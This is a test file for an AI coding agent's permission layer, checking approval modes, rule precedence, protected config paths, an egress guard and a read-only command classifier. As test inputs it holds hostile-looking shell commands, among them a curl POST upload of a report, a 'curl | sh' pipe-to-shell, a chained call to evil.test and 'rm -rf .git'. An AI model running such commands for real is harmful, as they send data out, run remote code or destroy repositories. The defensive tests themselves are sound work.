import { describe, expect, it } from 'vitest'
import { isAnalysisRequest, policyFor, shouldRequirePlan } from '../src/main/agent/runner'
import {
  evaluatePermission,
  globToRegExp,
  isReadOnlyShellCommand,
  isSafeWorkspaceFileCommand,
} from '../src/main/agent/permissions'
import { pilotTools, RUN_SHELL } from '../src/main/agent/tools'
import type {
  AgentToolDefinition,
  ApprovalMode,
  PermissionRules,
  ToolCall,
} from '../src/shared/types'

const tools = new Map(pilotTools.map((tool) => [tool.name, tool]))
const shell = tools.get(RUN_SHELL)
const readTool = tools.get('read_file')
const execTool = tools.get('run_command')
const writeTool = tools.get('write_file')
const workspace = process.cwd()

function tool(name: string): AgentToolDefinition {
  const found = tools.get(name)
  if (!found) throw new Error(`missing tool ${name}`)
  return found
}

function call(name: string, args: Record<string, unknown> = {}): ToolCall {
  return { id: 'call-1', name, arguments: args }
}

function rules(overrides: Partial<PermissionRules> = {}): PermissionRules {
  return { allow: [], ask: [], deny: [], ...overrides }
}

function evaluate(
  mode: ApprovalMode,
  name: string,
  args: Record<string, unknown>,
  options: {
    rules?: PermissionRules
    sandboxed?: boolean
    sandboxAutoAllow?: boolean
    trustedCommands?: string[]
    allowUnattendedBuild?: boolean
    learningMode?: boolean
    learningIsolateShell?: boolean
  } = {},
) {
  return evaluatePermission({
    mode,
    tool: tool(name),
    call: call(name, args),
    workspacePath: workspace,
    rules: options.rules ?? rules(),
    sandboxed: options.sandboxed ?? false,
    sandboxAutoAllow: options.sandboxAutoAllow ?? true,
    ...(options.trustedCommands ? { trustedCommands: options.trustedCommands } : {}),
    ...(options.allowUnattendedBuild !== undefined
      ? { allowUnattendedBuild: options.allowUnattendedBuild }
      : {}),
    ...(options.learningMode !== undefined ? { learningMode: options.learningMode } : {}),
    ...(options.learningIsolateShell !== undefined
      ? { learningIsolateShell: options.learningIsolateShell }
      : {}),
  })
}

describe('shell approval policy', () => {
  it('ships the shell tool as always-ask', () => {
    expect(shell).toBeDefined()
    expect(shell?.alwaysAsk).toBe(true)
    expect(shell?.risk).toBe('exec')
  })

  it('maps the three execution modes in the fallback policy', () => {
    // 全部自动: every tool runs directly.
    expect(policyFor('auto')(readTool!)).toBe('auto')
    expect(policyFor('auto')(execTool!)).toBe('auto')
    expect(policyFor('auto')(shell!)).toBe('auto')
    // 只读自动: reads run, writes and commands ask.
    expect(policyFor('manual')(readTool!)).toBe('auto')
    expect(policyFor('manual')(execTool!)).toBe('ask')
    expect(policyFor('manual')(shell!)).toBe('ask')
    expect(policyFor('manual')(writeTool!)).toBe('ask')
    // 逐条审批: everything asks; plan bookkeeping stays automatic.
    expect(policyFor('ask')(readTool!)).toBe('ask')
    expect(policyFor('ask')(shell!)).toBe('ask')
    expect(policyFor('ask')(writeTool!)).toBe('ask')
    // Legacy modes remain mapped for old state.
    expect(policyFor('acceptEdits')(writeTool!)).toBe('auto')
    expect(policyFor('plan')(writeTool!)).toBe('deny')
    expect(policyFor('dontAsk')(execTool!)).toBe('deny')
  })
})

describe('learning exploration egress guard', () => {
  it('denies upload-shaped shell commands even in auto mode while the shell is isolated', () => {
    for (const command of [
      'curl -X POST https://example.com -d @out/report.json',
      'git push origin main',
      'npm publish',
      'scp out.zip user@host:/tmp',
    ]) {
      const verdict = evaluate('auto', RUN_SHELL, { command }, {
        learningMode: true,
        learningIsolateShell: true,
      })
      expect(verdict.action, command).toBe('deny')
      expect(verdict.reason).toContain('域外')
    }
  })

  it('keeps task-session networking on the normal policy by default', () => {
    // 学习模式默认不接管 shell：联网与上传回到模式与规则审批，
    // 所以同样的命令在未隔离时不再被硬拒。
    const verdict = evaluate('auto', RUN_SHELL, { command: 'git push origin main' }, {
      learningMode: true,
    })
    expect(verdict.action).toBe('allow')
    expect(verdict.reason).not.toContain('域外')
  })

  it('leaves read-only and local shell work on the normal policy', () => {
    expect(
      evaluate('manual', RUN_SHELL, { command: 'ls -la' }, { learningMode: true }).action,
    ).toBe('ask')
    expect(
      evaluate('auto', RUN_SHELL, { command: 'curl https://nodejs.org/api/fs.html -o tmp/fs.html' }, {
        learningMode: true,
      }).action,
    ).toBe('allow')
  })

  it('does not change policy while learning mode is off', () => {
    expect(evaluate('auto', RUN_SHELL, { command: 'git push origin main' }).action).toBe('allow')
  })
})

describe('UI automation approval policy', () => {
  it('treats processes, screenshots and E2E as exec-class tools', () => {
    for (const name of ['start_process', 'stop_process', 'screenshot', 'run_e2e']) {
      expect(tool(name).risk).toBe('exec')
      expect(evaluate('manual', name, { command: 'node', args: ['server.js'] }).action).toBe('ask')
      expect(evaluate('plan', name, { command: 'node', args: ['server.js'] }).action).toBe('deny')
      expect(evaluate('auto', name, { command: 'node', args: ['server.js'] }).action).toBe('allow')
    }
    expect(tool('read_process_output').risk).toBe('read')
    expect(tool('list_processes').risk).toBe('read')
    expect(evaluate('manual', 'read_process_output', { id: 'proc-1' }).action).toBe('allow')
  })
})

describe('permission rules', () => {
  it('matches Claude-style tool and specifier rules', () => {
    expect(globToRegExp('src/**', true).test('src/main/index.ts')).toBe(true)
    expect(globToRegExp('src/**', true).test('tests/index.ts')).toBe(false)
    expect(globToRegExp('npm test:*', false).test('npm test -- --watch')).toBe(true)
  })

  it('evaluates deny before ask before allow', () => {
    const verdict = evaluate('auto', 'run_command', { command: 'git push --force' }, {
      rules: rules({
        allow: ['Bash(git push:*)'],
        ask: ['Bash(git push:*)'],
        deny: ['Bash(git push:*)'],
      }),
    })
    expect(verdict.action).toBe('deny')
    expect(verdict.source).toBe('rule')
  })

  it('lets a narrow allow rule approve a shell command in manual mode', () => {
    const verdict = evaluate('manual', 'run_shell', { command: 'git status' }, {
      rules: rules({ allow: ['Bash(git status)'] }),
    })
    expect(verdict.action).toBe('allow')
    expect(verdict.rule).toBe('Bash(git status)')
  })

  it('runs every tool in full-auto mode regardless of allow rules', () => {
    for (const rule of ['Bash(*)', 'Bash(python*)']) {
      const verdict = evaluate('auto', 'run_shell', { command: 'python setup.py install' }, {
        rules: rules({ allow: [rule] }),
      })
      expect(verdict.action).toBe('allow')
    }
  })

  it('keeps broad allow rules effective in manual mode', () => {
    const verdict = evaluate('manual', 'run_shell', { command: 'python setup.py install' }, {
      rules: rules({ allow: ['Bash(python*)'] }),
    })
    expect(verdict.action).toBe('allow')
  })

  it('protects agent configuration files even under an allow rule', () => {
    for (const path of ['.git/config', '.claude/settings.json', '.mcp.json', '.bashrc']) {
      const verdict = evaluate('auto', 'write_file', { path }, {
        rules: rules({ allow: ['Edit(*)', 'Write(*)'] }),
      })
      expect(verdict.action).toBe('deny')
      expect(verdict.source).toBe('protected')
    }
  })

  it('does not apply a read rule to a shell command', () => {
    const verdict = evaluate('manual', 'run_command', { command: 'rm -rf build' }, {
      rules: rules({ allow: ['Read(src/**)'] }),
    })
    expect(verdict.action).not.toBe('allow')
    expect(verdict.rule).toBeUndefined()
  })
})

describe('approval modes', () => {
  it('lets manual mode run obvious read-only commands', () => {
    expect(evaluate('manual', 'run_command', { command: 'ls -la' }).action).toBe('allow')
    expect(evaluate('manual', 'run_command', { command: 'git status' }).action).toBe('allow')
    expect(evaluate('manual', 'run_command', { command: 'rm -rf build' }).action).toBe('ask')
  })

  it('runs unsandboxed shell and non-trivial commands directly in full-auto mode', () => {
    expect(evaluate('auto', 'run_shell', { command: 'npm test' }).action).toBe('allow')
    expect(evaluate('auto', 'run_command', { command: 'npm test' }).action).toBe('allow')
    expect(evaluate('auto', 'write_file', { path: 'src/index.ts' }).action).toBe('allow')
  })

  it('always asks before turning editable source into a runnable personal build', () => {
    const commands = [
      'node scripts/self-build.mjs',
      'node scripts/self-build.mjs --run',
      'pnpm self-build',
      'pnpm run self-build',
      'pnpm package:win',
      'pnpm exec electron-builder --dir',
      'npx electron-builder --dir',
      'node_modules/.bin/electron-builder --dir',
      'release-selfdev/Pilot-0.1.25/Pilot.exe',
      'start release-selfdev/Pilot-0.1.25/Pilot.exe',
    ]
    for (const command of commands) {
      expect(evaluate('auto', 'run_shell', { command }).action).toBe('ask')
    }
    const verdict = evaluate('auto', 'run_shell', { command: 'node scripts/self-build.mjs' }, {
      rules: rules({ allow: ['Bash(node scripts/self-build.mjs)'] }),
    })
    expect(verdict.action).toBe('ask')
    expect(verdict.reason).toContain('亲自确认')

    // run_command passes the script as a separate argument.
    expect(
      evaluate('auto', 'run_command', {
        command: 'node',
        args: ['scripts/self-build.mjs'],
      }).action,
    ).toBe('ask')

    // Modes that cannot prompt must refuse instead of silently building.
    expect(evaluate('plan', 'run_shell', { command: 'pnpm self-build' }).action).toBe('deny')
    expect(evaluate('dontAsk', 'run_shell', { command: 'pnpm self-build' }).action).toBe('deny')

    // The explicit unattended-build setting covers auto mode only.
    expect(
      evaluate('auto', 'run_shell', { command: 'pnpm package:win' }, {
        allowUnattendedBuild: true,
      }).action,
    ).toBe('allow')
    expect(
      evaluate('manual', 'run_shell', { command: 'pnpm package:win' }, {
        allowUnattendedBuild: true,
      }).action,
    ).toBe('ask')
    expect(
      evaluate('plan', 'run_shell', { command: 'pnpm package:win' }, {
        allowUnattendedBuild: true,
      }).action,
    ).toBe('deny')
    // Deny rules still win over the setting.
    expect(
      evaluate('auto', 'run_shell', { command: 'pnpm package:win' }, {
        allowUnattendedBuild: true,
        rules: rules({ deny: ['Bash(pnpm package:win)'] }),
      }).action,
    ).toBe('deny')

    // Ordinary builds, tests and scripts stay automatic.
    expect(evaluate('auto', 'run_shell', { command: 'pnpm build' }).action).toBe('allow')
    expect(evaluate('auto', 'run_shell', { command: 'pnpm test' }).action).toBe('allow')
    expect(evaluate('auto', 'run_shell', { command: 'node scripts/other.mjs' }).action).toBe(
      'allow',
    )
    // Inspecting the build output stays automatic.
    expect(
      evaluate('auto', 'run_shell', { command: 'ls release-selfdev/Pilot-0.1.25' }).action,
    ).toBe('allow')
    expect(
      evaluate('auto', 'run_shell', { command: 'cat release-selfdev/Pilot-0.1.25/build-info.json' })
        .action,
    ).toBe('allow')
  })

  it('does not mistake an inspection of a build config for a build', () => {
    // Regression: a `cd ... && grep pilot/electron-builder.yml` task asked
    // for approval in full-auto mode because the path contained
    // "electron-builder"; the user was away and the call timed out.
    const transcriptCommand = String.raw`cd /e/code/agent/manbu-agent-workspace/pilot && echo "=== electron-builder 品牌字段 ===" && grep -n "productName\|appId\|executableName\|copyright" pilot/electron-builder.yml && echo && echo "=== app manifest 品牌 ===" && node -e "const m=require('./app/manifest.json');console.log(JSON.stringify({name:m.name,appid:m.appid,description:m.description,versionName:m.versionName},null,1))" && echo && echo "=== 站点域名/标题 ===" && (grep -rn "medpilot\|<title>\|og:site_name\|productName" site/*.html site/*.json 2>/dev/null | head -12)`
    expect(evaluate('auto', 'run_shell', { command: transcriptCommand }).action).toBe('allow')
    const readOnly = [
      'grep -n "productName\\|appId" pilot/electron-builder.yml',
      'cd /e/code/agent/manbu-agent-workspace/pilot && grep -n "productName" pilot/electron-builder.yml',
      'cat pilot/electron-builder.yml',
      'rg electron-builder pilot/src',
      'sed -n "1,20p" pilot/electron-builder.yml',
      'pnpm add -D electron-builder',
      'pnpm install',
      'pnpm test -- --grep electron-builder',
      'git grep -n electron-builder',
      'node --version',
      'echo "=== electron-builder 品牌字段 ==="',
    ]
    for (const command of readOnly) {
      expect(evaluate('auto', 'run_shell', { command }).action, command).toBe('allow')
    }

    const builds = [
      'cd pilot && node scripts/self-build.mjs',
      'pnpm --filter app run self-build',
      'node --run package:win',
      'cd client && npx electron-builder --dir',
      'cd client && ./node_modules/.bin/electron-builder --dir',
    ]
    for (const command of builds) {
      expect(evaluate('auto', 'run_shell', { command }).action, command).toBe('ask')
    }

    // Reading the produced binary stays inspection; launching it asks.
    expect(
      evaluate('auto', 'run_shell', {
        command: 'cat release-selfdev/Pilot-0.1.25/Pilot.exe',
      }).action,
    ).toBe('allow')
    expect(
      evaluate('auto', 'run_shell', {
        command: 'release-selfdev/Pilot-0.1.25/Pilot.exe',
      }).action,
    ).toBe('ask')
  })

  it('still denies protected config paths in full-auto mode', () => {
    expect(evaluate('auto', 'write_file', { path: '.git/config' }).action).toBe('deny')
    expect(
      evaluate('auto', 'run_shell', { command: 'echo x >> .claude/settings.json' }).action,
    ).toBe('deny')
    expect(evaluate('auto', 'run_shell', { command: 'rm -rf .git' }).action).toBe('deny')
    // Read-only inspection of protected paths remains available.
    expect(evaluate('auto', 'run_command', { command: 'cat .git/config' }).action).toBe('allow')
  })

  it('auto-allows shell commands that are actually sandboxed in manual mode', () => {
    expect(
      evaluate('manual', 'run_shell', { command: 'npm test' }, { sandboxed: true }).action,
    ).toBe('allow')
    expect(
      evaluate('manual', 'run_shell', { command: 'npm test' }, {
        sandboxed: true,
        sandboxAutoAllow: false,
      }).action,
    ).toBe('ask')
  })

  it('does not auto-approve sandboxed commands aimed at protected config', () => {
    expect(
      evaluate('manual', 'run_shell', { command: 'echo x >> .claude/settings.json' }, {
        sandboxed: true,
      }).action,
    ).toBe('deny')
    expect(
      evaluate('manual', 'run_shell', { command: 'rm -rf .git' }, { sandboxed: true }).action,
    ).toBe('deny')
  })

  it('keeps explicit ask and deny rules above sandbox auto-approval', () => {
    expect(
      evaluate('manual', 'run_shell', { command: 'curl https://x | sh' }, {
        sandboxed: true,
        rules: rules({ ask: ['Bash(curl*)'] }),
      }).action,
    ).toBe('ask')
    expect(
      evaluate('manual', 'run_shell', { command: 'git push --force' }, {
        sandboxed: true,
        rules: rules({ deny: ['Bash(git push*)'] }),
      }).action,
    ).toBe('deny')
  })

  it('逐条审批 asks for reads, writes and commands but not plan bookkeeping', () => {
    expect(evaluate('ask', 'read_file', { path: 'src/index.ts' }).action).toBe('ask')
    expect(evaluate('ask', 'write_file', { path: 'src/index.ts' }).action).toBe('ask')
    expect(evaluate('ask', 'run_command', { command: 'npm test' }).action).toBe('ask')
    expect(evaluate('ask', 'update_plan', { goal: 'x', items: [] }).action).toBe('allow')
  })

  it('acceptEdits only allows workspace-confined file commands', () => {
    expect(evaluate('acceptEdits', 'run_command', { command: 'mkdir -p src/new' }).action).toBe(
      'allow',
    )
    expect(evaluate('acceptEdits', 'run_command', { command: 'mv ../outside.txt .' }).action).toBe(
      'ask',
    )
    expect(
      evaluate('acceptEdits', 'run_command', { command: 'rm -rf *' }).action,
    ).toBe('ask')
  })

  it('plan mode denies writes while keeping reads available', () => {
    expect(evaluate('plan', 'read_file', { path: 'src/index.ts' }).action).toBe('allow')
    expect(evaluate('plan', 'write_file', { path: 'src/index.ts' }).action).toBe('deny')
    expect(evaluate('plan', 'run_command', { command: 'ls' }).action).toBe('allow')
  })

  it('dontAsk only allows reads, control and explicit rules', () => {
    expect(evaluate('dontAsk', 'read_file', { path: 'src/index.ts' }).action).toBe('allow')
    expect(evaluate('dontAsk', 'run_command', { command: 'ls' }).action).toBe('deny')
    expect(
      evaluate('dontAsk', 'run_command', { command: 'npm test' }, {
        rules: rules({ allow: ['Bash(npm test:*)'] }),
      }).action,
    ).toBe('allow')
  })

  it('never lets a rule bypass plan mode for a mutating tool', () => {
    for (const list of [
      rules({ allow: ['Edit(*)'] }),
      rules({ ask: ['Edit(*)'] }),
    ]) {
      const verdict = evaluate('plan', 'write_file', { path: 'src/index.ts' }, { rules: list })
      expect(verdict.action).toBe('deny')
    }
  })

  it('turns ask rules into denials in dontAsk mode', () => {
    const verdict = evaluate('dontAsk', 'run_command', { command: 'npm test' }, {
      rules: rules({ ask: ['Bash(npm test:*)'] }),
    })
    expect(verdict.action).toBe('deny')
  })
})

describe('command classification helpers', () => {
  it('recognizes read-only commands and rejects shell composition', () => {
    expect(isReadOnlyShellCommand('ls -la')).toBe(true)
    expect(isReadOnlyShellCommand('git status --short')).toBe(true)
    expect(isReadOnlyShellCommand('npm --version')).toBe(true)
    expect(isReadOnlyShellCommand('git branch -a')).toBe(true)
    expect(isReadOnlyShellCommand('git tag --list')).toBe(true)
    expect(isReadOnlyShellCommand('git remote -v')).toBe(true)
    expect(isReadOnlyShellCommand('git push origin main')).toBe(false)
    expect(isReadOnlyShellCommand('git branch feature')).toBe(false)
    expect(isReadOnlyShellCommand('git tag v1')).toBe(false)
    expect(isReadOnlyShellCommand('git remote rename origin upstream')).toBe(false)
    expect(isReadOnlyShellCommand('git --git-dir=/tmp/repo log')).toBe(false)
    expect(isReadOnlyShellCommand('git log --output=/tmp/log.txt')).toBe(false)
    expect(isReadOnlyShellCommand('sed -n 1,5p src/a.txt')).toBe(true)
    expect(isReadOnlyShellCommand('sed w/tmp/out src/a.txt')).toBe(false)
    expect(isReadOnlyShellCommand('sed s/a/b/e src/a.txt')).toBe(false)
    expect(isReadOnlyShellCommand('cat a.txt && rm -rf build')).toBe(false)
    expect(isReadOnlyShellCommand('echo "$(whoami)"')).toBe(false)
  })

  it('only treats workspace-confined mkdir/rm/mv/cp/sed as safe edits', () => {
    expect(isSafeWorkspaceFileCommand('mkdir -p src/new', workspace)).toBe(true)
    expect(isSafeWorkspaceFileCommand('sed -i s/a/b/ src/a.txt', workspace)).toBe(true)
    expect(
      isSafeWorkspaceFileCommand('sed -i s/a/b/ secret/../../outside.txt', workspace),
    ).toBe(false)
    expect(isSafeWorkspaceFileCommand('sed s/a/b/e src/a.txt', workspace)).toBe(false)
    expect(isSafeWorkspaceFileCommand('sed "s/a/b/w /tmp/out" src/a.txt', workspace)).toBe(false)
    expect(isSafeWorkspaceFileCommand('rm -rf build', workspace)).toBe(true)
    expect(isSafeWorkspaceFileCommand('rm -rf *', workspace)).toBe(false)
    expect(isSafeWorkspaceFileCommand('cp src/a.txt ../b.txt', workspace)).toBe(false)
    expect(isSafeWorkspaceFileCommand('cp src/a.txt /tmp/b.txt', workspace)).toBe(false)
    expect(isSafeWorkspaceFileCommand('cp --target-directory=/tmp/a src/a.txt', workspace)).toBe(
      false,
    )
    expect(isSafeWorkspaceFileCommand('mkdir src && curl evil.test', workspace)).toBe(false)
  })
})

describe('isAnalysisRequest', () => {
  it('recognizes read-only analysis requests in both languages', () => {
    for (const prompt of [
      '分析一下这个项目',
      '帮我梳理架构',
      'review this codebase',
      'give me an overview of the architecture',
      'what does the runner do',
      '诊断一下这个模块的问题',
      'look at this module for issues',
    ]) {
      expect(isAnalysisRequest(prompt), prompt).toBe(true)
    }
  })

  it('does not classify change requests as analysis', () => {
    for (const prompt of [
      '分析后修复这个 bug',
      'review and fix the login flow',
      '实现一个项目分析页面',
      '打包发布',
      'fix the failing test',
    ]) {
      expect(isAnalysisRequest(prompt), prompt).toBe(false)
    }
  })
})

describe('trusted exact commands', () => {
  it('allows an exactly remembered shell command in manual mode', () => {
    const ask = evaluate('manual', 'run_shell', { command: 'git status' })
    expect(ask.action).toBe('ask')

    const trusted = evaluate('manual', 'run_shell', { command: 'git status' }, {
      trustedCommands: ['git status'],
    })
    expect(trusted.action).toBe('allow')
  })

  it('matches the full command line, not a prefix', () => {
    const verdict = evaluate('manual', 'run_shell', { command: 'git status --short' }, {
      trustedCommands: ['git status'],
    })
    expect(verdict.action).toBe('ask')
  })

  it('keeps deny rules and protected paths above a remembered command', () => {
    const denied = evaluate('manual', 'run_shell', { command: 'git status' }, {
      rules: rules({ deny: ['Bash(git status)'] }),
      trustedCommands: ['git status'],
    })
    expect(denied.action).toBe('deny')

    const protectedPath = evaluate('manual', 'run_shell', { command: 'rm .git/config' }, {
      trustedCommands: ['rm .git/config'],
    })
    expect(protectedPath.action).toBe('deny')
  })

  it('does not let a remembered command escape plan mode', () => {
    const verdict = evaluate('plan', 'run_shell', { command: 'touch x.txt' }, {
      trustedCommands: ['touch x.txt'],
    })
    expect(verdict.action).toBe('deny')
  })
})

describe('shouldRequirePlan', () => {
  it('skips the plan round trip for a single short instruction', () => {
    expect(shouldRequirePlan('运行 pnpm test')).toBe(false)
    expect(shouldRequirePlan('打开 pilot 看一下界面并截图')).toBe(false)
    expect(shouldRequirePlan('git status && git log -5')).toBe(false)
  })

  it('still requires a plan for explicit multi-step work', () => {
    expect(shouldRequirePlan('依次完成登录、注册和退出')).toBe(true)
    expect(shouldRequirePlan('实现登录功能并补充测试')).toBe(true)
    expect(shouldRequirePlan('第一行\n第二行\n第三行')).toBe(true)
  })
})
